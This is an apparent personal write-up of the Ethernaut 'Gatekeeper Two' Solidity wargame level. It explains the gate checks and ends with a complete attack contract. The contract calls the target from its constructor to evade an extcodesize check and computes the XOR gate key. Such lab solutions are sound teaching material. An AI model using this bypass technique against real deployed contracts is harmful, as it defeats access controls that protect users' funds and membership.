# 14. Gatekeeper Two
This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
Things that might help:

    Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
    The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
    The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.
	
### gateOne()
- same as Gatekeeper One - use a contract to call

### gateTwo()
```
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

solidity docs:  
`caller()` call sender (excluding `delegatecall`)

created a test contract + funciton
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract assembly_caller_test {

	function caller_test() public view returns (address) {
		address x;
		assembly { x := caller()}
		return x;
	}
}
```

returned remix test account  
change test:  
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract assembly_caller_test {

	function caller_test() public view returns (uint) {
		uint x;
		assembly { x := extcodesize(caller()) }
		return x;
	}
}
```

calling this returns 0 ... should pass with any account

### gateThree(bytes8 _gatekey)
```
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```

for any XOR function: A XOR B = C, C XOR B = A  
thus, we can write a function to get the gateKey using our address:
```

function get_gatekey() public view returns (bytes8) {

	uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;

	return bytes8(gateKey);

}
```

final contract to enter, using template from GatekeeperOne:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperTwoAttack {

	bool public res;
	bytes public dat;

	constructor(address GatekeeperTwoContractAddress) public {
		uint64 gateKey64 = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1;

		bytes8 gateKey = bytes8(gateKey64);
		bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")),gateKey);

		(bool result, bytes memory data) = address(GatekeeperTwoContractAddress).call(encodedParams);
		res = result;
		dat = data;
}

}
```

**END**  
Level completed!

Difficulty 6/10

Way to go! Now that you can get past the gatekeeper, you have what it takes to join [theCyber](https://etherscan.io/address/thecyber.eth#code), a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on [reddit](https://www.reddit.com/user/0age) or via [email](mailto:0age@protonmail.com) and use it to register with the contract at [gatekeepertwo.thecyber.eth](https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) (be aware that only the first 128 entrants will be accepted by the contract).